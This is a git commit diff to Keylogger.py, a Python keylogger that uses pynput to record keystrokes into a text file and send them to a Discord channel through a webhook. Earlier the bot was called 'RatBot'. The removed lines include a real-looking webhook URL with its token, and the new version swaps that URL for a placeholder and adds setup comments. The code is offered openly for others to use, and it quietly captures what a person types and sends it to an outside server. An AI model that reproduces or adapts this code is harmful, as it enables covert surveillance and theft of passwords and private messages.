e2156720aa598fd06c3452266dad88e47f5f3639
Punch <140356286+Punch7577@users.noreply.github.com>
2024-03-16 15:24:52 -0400

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,11 +1,13 @@
-# Simple Keylogger that Logs Keys into a Discord Text Channel of your Liking via its Webhook.
-# For more Information, check out the READ.ME
+# Simple Keylogger that Logs Keys into a text file and then sends the info to a Discord Text Channel of your Liking via its Webhook.
+# For more Information, check out the READ.ME, or contact Punch7577.
+# NOTE: This is the BETA version of this project. It does not include a GUI. In the future, I will add a GUI to it to make it more interactive. It will likely have a localhost based GUI for users to use it on their web browser.
+# Until then, enjoy the raw code and tell me what I can improve on.
 
 from pynput.keyboard import Listener
 import requests, time, os
 
 # Webhook URL (for the Discord server)
-url = 'https://discord.com/api/webhooks/1133222518967255142/lccCX-EVBt5mPoZugBXdCEdLUWTodN_uEZx7hRwTog25OPD3F6T2u485W8eOO4OjFbn-'
+url = 'The webhook'
 
 # Global variable
 replace = 0
@@ -13,7 +15,7 @@ replace = 0
 
 def on_press(key):
     global replace
-    with open('log', 'a') as f:
+    with open('txt', 'a') as f: # IMPORTANT: You NEED to create a text file for this, or else it will not work. Replace the 'txt' in every open function with the name of your text file.
         k = str(key).replace("'", "")
         print(f'{key}')
         if k.find('space') > 0:
@@ -25,37 +27,37 @@ def on_press(key):
             print('The Keylogger Logged some Keys!')
             file_linereplace(1)
         elif k.find('backspace') > 0:
-            f.seek(f.tell() - 1, os.SEEK_SET)  # Move the cursor back one position
+            f.seek(f.tell() - 1, os.SEEK_SET)
             f.truncate()  # Deletes the last character typed in the code
         elif k.find('Key') == -1:
             f.write(k)
 
 
 def file_linereplace(line_replace):
-    with open('log', 'r') as u:
+    with open('txt', 'r') as u:
         f = u.readlines()
         if 1 <= line_replace <= len(f):
             del f[line_replace - 1]
         else:
-            print('Error: Line number out of range.')
+            print('Error: Line number out of range.') #This is the error message that will show if you click enter if there is nothing in the text file.
         with open('log', 'w') as d:
             for line in f:
                 d.write(line)
 
 
 def discordchannelsend():
-    with open('log', 'r') as lines:
+    with open('txt', 'r') as lines:
         formatting = lines.readlines()
         NoDotsOrSquareBrackets = ''.join(formatting)
 
     data = {
-        'avatar_url': 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2F3c1703fe8d.site.internapcdn.net%2Fnewman%2Fgfx%2Fnews%2Fhires%2F2018%2F3-rat.jpg&f=1&nofb=1&ipt=533872860dbda285a7f2a9f48c75690db28f18995f1c58c5759d2e4f3920b83c&ipo=images',
-        'username': 'RatBot',
-        'content': 'Hello',
+        'avatar_url': 'Whatever you want the avatar to be',
+        'username': 'Whatever you want the name of the bot to be',
+        'content': 'Whatever you want it to say',
         'embeds': [
             {
                 'title': '***INFO***',
-                'color': 0x00FFFF,
+                'color': 0x00FFFF, #Whatever color you want
                 'description': NoDotsOrSquareBrackets
             }
         ]
@@ -64,7 +66,7 @@ def discordchannelsend():
 
 
 def main():
-    with open('log', 'r') as file:
+    with open('txt', 'r') as file:
         content = file.read()
         print(content)
 
